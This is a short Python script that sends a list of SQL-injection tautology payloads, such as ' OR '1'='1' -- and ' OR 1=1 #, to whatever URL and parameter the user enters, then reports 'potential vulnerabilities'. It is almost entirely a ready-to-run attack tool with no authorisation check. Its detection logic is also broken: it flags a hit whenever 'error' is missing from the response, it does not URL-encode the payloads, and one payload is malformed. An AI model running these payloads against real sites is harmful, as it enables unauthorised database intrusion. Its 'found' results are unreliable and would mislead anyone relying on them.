import requests
from urllib.parse import urljoin

# Define the SQL Injection Payloads
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' ({",
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR 1=1 /*",
    "' OR 'a'='a",
    "' OR 'a'='a' --",
    "' OR 'a'='a' #",
    "' OR 'a'='a' /*",
]

# Function to Test for SQL Injection
def test_sql_injection(url, param):
    for payload in payloads:
        injection_url = f"{url}?{param}={payload}"
        response = requests.get(injection_url)
        if "error" not in response.text.lower():
            print(f"Potential SQL Injection vulnerability found with payload: {payload}")
        else:
            print(f"No vulnerability found with payload: {payload}")

# Run the Tests
if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    param = input("Enter the parameter to test: ")
    test_sql_injection(target_url, param)
